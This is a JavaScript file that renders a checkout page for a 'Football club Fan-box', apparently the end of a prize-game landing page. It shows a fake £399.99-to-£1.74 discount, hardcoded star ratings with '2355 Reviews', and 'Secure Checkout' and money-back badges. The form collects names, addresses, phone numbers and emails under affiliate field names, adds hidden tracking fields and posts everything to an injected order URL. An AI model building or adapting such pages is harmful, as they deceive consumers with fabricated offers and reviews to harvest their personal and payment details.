const orderHref = window.__order_href;
 
const withoutCartHref = `${orderHref}?origin=${o_param}`;

const cartPhoneCountryCode = "44";
const cartPhoneMask = "0000000000";

 
const heroData = [
  {
    heroTitle: "Football club Fan-box",
    priceOld: "£399.99",
    priceNew: "£1.74",
  }
];

// Отступ от кода страны до ввода самого номера
const phoneInputPadding = "39px";

const cartInit = () => {
  "use strict";
  const pageTitleTexts = {
    main: "Delivery",
    after:
      "Goods are not reserved until the order has been placed..",
  };
  const checkoutTopPromoTexts = {
    main: "Online payment only",
    bold: "In the online shop",
  };
  const deliveryStepTexts = {
    step: "Delivery",
    addressField: "Delivery address",
    countryField: "Country",
    // NEU
    cityField: "City",
    zipCode: "Index",
    // NEU
  };
  const paymentMethodsStepTexts = {
    step: "Payment methods",
    cardOnline: "Pay by card online",
  };
  const personInfoStepTexts = {
    step: "Personal information",
    phone: "Telephone number",
    email: "E-Mail",
    name: "Name",
    surname: "Surname",
  };
  const cartText = "Choice of goods";
  const checkoutPacksText =
    "We'll pack your set for free.";

  const finishTexts = {
    policy:
      "I accept the privacy policy and the processing of personal data, orders and returns.",
    orderSum: "Order amount",
    delivery: {
      text: "Delivery",
      value: "Free",
    },
    summary: "Total",
    button: "Paying for your order",
  };

  const mainContentEl = document.querySelector("#cartMainContent");

  mainContentEl.innerHTML = `
  <link rel="stylesheet" href="./assets/main.cart.css" />
  <link rel="stylesheet" href="./assets/cart.css" />
  <link rel="stylesheet" href="./assets/intlTelInput.min.css" />
  <link rel="stylesheet" href="./assets/all.min.css" />

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css" as="style"
    onload="this.onload=null;this.rel='stylesheet'" />
  `;

  const submitButton = document.createElement("button");
  submitButton.classList.add("button", "place-order");
  submitButton.innerHTML = `<span>${finishTexts.button}</span>`;
  submitButton.setAttribute("disabled", "true");
  submitButton.setAttribute("type", "submit");

  const columnBlockEl = document.createElement("form");
  columnBlockEl.setAttribute("action", orderHref);
  columnBlockEl.classList.add("columns");
  const columnsMainEl = document.createElement("div");
  columnsMainEl.classList.add("column", "main");
  const checkoutContainerEl = document.createElement("div");
  checkoutContainerEl.classList.add("checkout-container");
  checkoutContainerEl.setAttribute("id", "checkout");

  const cartItemsMobile = document.createElement("div");
  cartItemsMobile.classList.add("opc-cart-items", "_mobile");

  cartItemsMobile.innerHTML = `
  <div class="cart-container" role="tablist">
    <div class="summary-header active">
      <span>${cartText}</span>
    </div>
    <div class="form form-cart" data-role="content" role="tabpanel" aria-hidden="false">
      <div class="cart-wrapper">
        <div class="cart-item">
          <div class="item-info">
            <span class="product-item-photo">
              <img src="${giftImgWin.src}" width="78" height="78">
            </span>
            <div class="product-item-details">
              <div class="product-item-name">${heroData[0].heroTitle}</div>
                <div class="cart-subtotal"><span style="text-decoration: line-through">${heroData[0].priceOld}</span> <b style="color: red">${heroData[0].priceNew}</b></div>
              <div class="cart-item-data">
                <div class="qty-control qty-minus"><span>-</span></div>
                <input readonly="" type="text" maxlength="2" class="qty-input" data-role="cart-item-qty" value="1" disabled />
                <div class="qty-control qty-plus"><span>+</span></div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  `;

  checkoutContainerEl.appendChild(cartItemsMobile);

  const initColumns = () => {
    const opcWrapperEl = document.createElement("div");
    opcWrapperEl.classList.add("opc-wrapper");
    const stepsEl = document.createElement("ol");
    stepsEl.classList.add("opc");
    stepsEl.setAttribute("id", "checkoutSteps");

    const initDeliveryStep = () => {
      const localEl = document.createElement("li");
      localEl.classList.add(
        "checkout-shipping-method",
        "checkout-shipping-step",
        "opc__step",
        "opc__step_delivery"
      );
      localEl.setAttribute("id", "opc-shipping_method");

      const checkoutShippingEl = document.createElement("div");
      checkoutShippingEl.classList.add("checkout-shipping-method");

      const contentEl = document.createElement("div");
      contentEl.classList.add("checkout-content-block");
      contentEl.setAttribute("style", "display: block");
      contentEl.innerHTML = `
      <h2 class="mb-4 center">
      <b>Secure Checkout</b>&nbsp;&nbsp;<i
        class="fas fa-lock mt-2"></i>
      </h2>
      <p class="fs-14 center">
      <span style="
            color: #ffc107;
          ">
        <i class="fas fa-star"></i><i
          class="fas fa-star"></i><i
          class="fas fa-star"></i><i
          class="fas fa-star"></i><i
          class="fas fa-star-half"></i></span>
      (2355
      Reviews)
      </p>
      <div class="row m-0 p-2 w-100 row-input">
      <div class="col-6" style="padding: 10px 5px 0;">
        <input type="text" id="first_name"
        name="aff_unique1" placeholder="First name"
          value="" required=""
          class="form-control unedited-field" />
      </div>

      <div class="col-6" style="padding: 10px 5px 0;">
        <input type="text" id="last_name"
        name="aff_unique2" placeholder="Last name"
          value="" required=""
          class="form-control unedited-field" />

          <!-- NEU -->
          <input type="hidden" name="origin" id="origin_field" />
          <input type="hidden" name="aff_sub5" id="fbpixel_field" />
          <!-- NEU -->
      </div>
      <div class="w-100 row-input">
      <div class="col-12" style="padding: 10px 5px 0;">
        <input id="line_1" name="aff_sub3" type="text"
          placeholder="Address" value="" required=""
          class="form-control unedited-field" />
      </div>
    </div>
      <div class="row m-0 w-100 row-input">
      <div class="col-6" style="
            padding: 10px
              5px
              0;
          ">
        <input id="zip_or_postcode"
          name="aff_unique4" type="text"
          placeholder="Zip or Postcode" value=""
          required=""
          class="form-control unedited-field" />
      </div>

      <div class="col-6" style="padding: 10px 5px 0;">
        <input id="city" name="aff_unique5" type="text"
          placeholder="City" value="" required=""
          class="form-control unedited-field" />
      </div>
    </div>

    <div class="w-100 row-input">
      <div class="col-12" style="padding: 10px 5px 0;">
        <select id="country_code" name="aff_unique3"
          required=""
          class="form-control unedited-field">
          <option value="" disabled="" hidden="">
            Country
          </option>
          <option class="text-black" value="GB"
            selected="">
            United Kingdom
          </option>
        </select>
      </div>
    </div>

    <div class="w-100 row-input">
      <div class="col-12" style="padding: 10px 5px 0;">
        <div
          class="iti iti--allow-dropdown iti--separate-dial-code">
          <div class="iti__flag-container">
            <div class="iti__selected-flag">
              <div class="iti__flag iti__gb"></div>
            </div>
          </div>
          <input type="tel" name="aff_sub6" value="+44"
            placeholder="Phone number"
            required
            class="form-control unedited-field" style="padding-left: 45px;" />
        </div>
      </div>
    </div>

    <div class="w-100 row-input">
      <div class="col-12" style="padding: 10px 5px 0;">
        <input type="email" id="email" name="aff_sub4" 
          placeholder="E-mail" value="" required=""
          class="form-control unedited-field" />
      </div>
    </div>
    </div>
    
    <div class="checkout-agreements mt-4">
        <div class="checkout-agreement required" style="margin-top: 0">
          <input type="checkbox" class="required-entry" id="agreement__1" name="" autocomplete="off" required>
          <label for="agreement__1">
            <span style="text-decoration: underline; cursor: pointer; color: black">${finishTexts.policy}</span>
          </label>
        </div>
      </div>
      `;

      const securityEl = document.createElement("div");
      securityEl.innerHTML = `
      <div class="d-block mt-4">
      <div
        class="d-flex w-98">
        <div
          class="cmp-card cmp-card--card-without-border cmp-card--bg-transparent">
          <div data-card-badge="no"
            class="cmp-card__section extras pt-sm-2 px-0 cmp__card--color cmp__card--color-default">
            <div class="cmp-card__badge"></div>
            <div class="cmp-card__img">
              <div class="image">
                <div class="text-center cmp-image mb-2">
                  <img alt="support"
                    src="./assets/1621009593152.svg"
                    class="v-lazy-image v-lazy-image-loaded"
                    title="Free technical support" />
                </div>
              </div>
            </div>
            <div class="cmp-card__body card-body">
              <div class="cmp-cardcontent">
                <div
                  class="cmp-text px-3 font-weight-bold cmp__richtext--color cmp__richtext--color-default">
                  <p style="
                        text-align: center;
                      ">
                    <span class="font-size-sm">
                      Free
                      technical
                      support
                    </span>
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div
          class="cmp-card cmp-card--card-without-border cmp-card--bg-transparent">
          <div data-card-badge="no"
            class="cmp-card__section extras pt-2 px-0 cmp__card--color cmp__card--color-default">
            <div class="cmp-card__badge"></div>
            <div class="cmp-card__img">
              <div class="image">
                <div class="text-center cmp-image mb-2">
                  <img alt="guarantee"
                    src="./assets/1621009604022.png"
                    class="v-lazy-image v-lazy-image-loaded"
                    title="30-day money-back guarantee" />
                </div>
              </div>
            </div>
            <div class="cmp-card__body card-body">
              <div class="cmp-cardcontent">
                <div
                  class="cmp-text font-weight-bold cmp__richtext--color cmp__richtext--color-default">
                  <p style="
                        text-align: center;
                      ">
                    <span class="font-size-sm">
                      30-day
                      money-back
                      guarantee
                    </span>
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div
          class="cmp-card cmp-card--card-without-border cmp-card--bg-transparent">
          <div data-card-badge="no"
            class="cmp-card__section extras pt-2 px-0 cmp__card--color cmp__card--color-default">
            <div class="cmp-card__badge"></div>
            <div class="cmp-card__img">
              <div class="image">
                <div class="text-center cmp-image mb-2">
                  <img alt="secure checkout"
                    src="./assets/secure-checkout.png"
                    class="v-lazy-image v-lazy-image-loaded"
                    title="secure-checkout" />
                </div>
              </div>
            </div>
            <div class="cmp-card__body card-body">
              <div class="cmp-cardcontent">
                <div
                  class="cmp-text font-weight-bold cmp__richtext--color cmp__richtext--color-default">
                  <p style="
                        text-align: center;
                      ">
                    <span class="font-size-sm">
                      Secure
                      Checkout
                    </span>
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
      `;

      checkoutShippingEl.appendChild(contentEl);
      localEl.appendChild(checkoutShippingEl);
      stepsEl.appendChild(localEl);
      localEl.appendChild(submitButton);
      localEl.appendChild(securityEl);
    };

    initDeliveryStep();

    checkoutContainerEl.appendChild(opcWrapperEl);
    opcWrapperEl.appendChild(stepsEl);
    columnsMainEl.appendChild(checkoutContainerEl);
    columnBlockEl.appendChild(columnsMainEl);
    mainContentEl.appendChild(columnBlockEl);
    // NEU
    document.getElementById("origin_field").value = o_param;
    document.getElementById("fbpixel_field").value = fb_param;
    // NEU
  };

  const initSidebar = () => {
    const mainBlockEl = document.createElement("aside");
    mainBlockEl.classList.add(
      "modal-custom",
      "opc-sidebar",
      "opc-summary-wrapper",
      "custom-slide"
    );

    const modalInnerWrapEl = document.createElement("div");
    modalInnerWrapEl.classList.add("modal-inner-wrap");

    const modalContentEl = document.createElement("div");
    modalContentEl.classList.add("modal-content");

    const opcSidebar = document.createElement("div");
    opcSidebar.setAttribute("id", "opc-sidebar");

    const initCardSidebar = () => {
      const localEl = document.createElement("div");
      localEl.classList.add("opc-cart-items");

      localEl.innerHTML = `
        <div class="cart-container" role="tablist">
          <div data-role="title" class="summary-header active" data-collapsible="true" role="tab" aria-selected="false" aria-expanded="true" tabindex="0">
              <span>${cartText}</span>
          </div>

          <div class="form form-cart" data-role="content" role="tabpanel" aria-hidden="false">
              <div class="cart-wrapper">
                  <div class="cart-item" data-bind="css: {'out-of-stock': !$parent.extension_attributes.stock_status}">
                      <div class="item-info">
                          <span class="product-item-photo">
                              <img src="${giftImgWin.src}" width="78" height="78" />
                          </span>
                          <div class="product-item-details">
                              <div class="product-item-name">${heroData[0].heroTitle}</div>
                              <div class="cart-subtotal"><span style="text-decoration: line-through">${heroData[0].priceOld}</span> <b style="color: red">${heroData[0].priceNew}</b></div>

                              <dl class="item-options"></dl>

                              <div class="cart-item-data">
                                  <div class="qty-counter">
                                      <div data-bind="event: {click: changeQty.bind($data, $parents[1].qty, $parents[1].item_id, 'decrement')}" class="qty-control qty-minus"><span>-</span></div>
                                      <input type="text" maxlength="2" class="qty-input" value="1" disabled />
                                      <div data-bind="event: {click: changeQty.bind($data, $parents[1].qty, $parents[1].item_id, 'increment')}" class="qty-control qty-plus"><span>+</span></div>
                                  </div>
                                  <a href="#" class="action action-delete" data-bind="event: {click: removeItem.bind($data, $parents[1].item_id)}">
                                      <span data-bind="i18n: 'Delete'">Удалить</span>
                                  </a>
                              </div>
                          </div>
                      </div>
                  </div>
              </div>
          </div>
      </div>
      `;

      opcSidebar.appendChild(localEl);
    };

    const initPackTextSidebar = () => {
      const localEl = document.createElement("div");
      localEl.classList.add("opc-cart-items");

      localEl.innerHTML = `
      <div class="cart-container">
        <div class="cart-footer">
          <div class="widget block block-static-block">
            <div class="checkout-packs">
              <div class="checkout-packs__text-wrapper">
                <div class="parent  fl-block">
                  <div class="checkout-packs__text child">${checkoutPacksText}</div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      `;

      opcSidebar.appendChild(localEl);
    };

    const initSummarySidebar = () => {
      const localEl = document.createElement("li");
      localEl.classList.add("opc-block-summary");

      const policyEl = document.createElement("div");
      policyEl.innerHTML = `
      <div class="checkout-agreements">
        <div class="checkout-agreement required" style="margin-top: 0">
          <input type="checkbox" class="required-entry" id="agreement__1" name="" autocomplete="off" required>
          <label for="agreement__1">
            <span style="text-decoration: underline; cursor: pointer; color: black">${finishTexts.policy}</span>
          </label>
        </div>
      </div>
      `;

      opcSidebar.appendChild(localEl);
    };

    initCardSidebar();
    initPackTextSidebar();

    modalContentEl.appendChild(opcSidebar);
    modalInnerWrapEl.appendChild(modalContentEl);
    mainBlockEl.appendChild(modalInnerWrapEl);
    checkoutContainerEl.appendChild(mainBlockEl);
  };

  initColumns();
  initSidebar();

  const agreementInput = document.querySelector("#agreement__1");

  const checkAgreementInput = () => {
    if (agreementInput.checked) {
      submitButton.removeAttribute("disabled");
    } else {
      submitButton.setAttribute("disabled", "true");
    }
  };

  agreementInput.addEventListener("change", checkAgreementInput);
  checkAgreementInput();

  closeGame();

  document.querySelector("#cart").setAttribute("style", "display: block");
};
